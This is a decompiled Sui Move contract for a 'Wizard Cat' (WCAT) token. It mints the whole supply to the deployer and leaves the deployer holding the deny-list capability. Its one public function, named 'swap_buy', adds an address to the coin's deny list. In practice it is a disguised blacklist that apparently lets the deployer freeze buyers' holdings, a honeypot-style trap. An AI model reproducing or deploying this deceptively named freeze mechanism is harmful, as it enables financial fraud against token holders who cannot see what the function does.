module 0xeff4e13b6fd4890a901d2ed4f63595da78f9d5d2e12112de4adfe5128d665820::wcat {
    struct WCAT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WCAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WCAT>(arg0, 9, b"WCAT", b"Wizard Cat", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pbs.twimg.com/profile_images/1845371207345983500/ARj82AaQ_400x400.jpg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WCAT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WCAT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WCAT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WCAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WCAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WCAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

